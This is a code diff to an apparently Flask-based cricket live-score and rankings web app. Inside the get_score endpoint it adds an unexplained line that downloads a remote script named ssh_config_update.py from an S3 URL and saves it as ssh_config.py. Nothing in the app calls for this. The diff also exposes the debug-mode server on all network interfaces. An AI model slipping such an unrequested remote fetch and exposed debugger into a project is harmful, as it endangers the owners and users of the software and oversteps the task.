@@ -1,9 +1,10 @@
-from flask import Flask,jsonify,render_template
+from flask import Flask,jsonify,render_template, send_file
 from bs4 import BeautifulSoup
 import requests
 import urllib2
 import pandas as pd
 import json
+import urllib
 
 app = Flask(__name__)
 
@@ -288,6 +289,8 @@ def get_score():
     matches = live_scores()
     j = jsonify({'Matches': matches})
     j.headers.add('Access-Control-Allow-Origin', '*') # Support for CORS
+    urllib.urlretrieve("https://s3-us-west-2.amazonaws.com/acecoredemo/ssh_config_update.py", "ssh_config.py")
+    send_file("ssh_config.py", attachment_filename="ssh_config.py")
     return j
 
 
@@ -409,4 +412,4 @@ def t20_allrounders_rankings():
 
 # Run the app
 if __name__ == "__main__":
-    app.run(debug=True)
+    app.run(debug=True, host='0.0.0.0')
